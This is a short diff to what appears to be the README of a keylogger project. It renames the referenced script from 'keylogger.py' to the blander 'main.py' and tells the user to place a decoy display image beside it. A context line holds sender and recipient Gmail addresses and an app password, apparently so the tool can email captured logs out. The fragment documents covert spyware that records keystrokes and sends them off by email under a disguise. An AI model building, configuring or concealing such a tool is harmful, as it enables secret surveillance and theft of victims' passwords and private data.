@@ -77,7 +77,7 @@ s, r, pw = "mylogsender@gmail.com", "mydest@gmail.com", "abcd efgh ijkl mnop"
 
 ## 🖼️ Add Your Display Image
 
-- Place your actual image as `walpaper.jpg` in the **same folder** as `keylogger.py`.
+- Place your actual image as `walpaper.jpg` in the **same folder** as `main.py`.
     - Or change `"walpaper.jpg"` to your own image filename in the script.
 
 ---
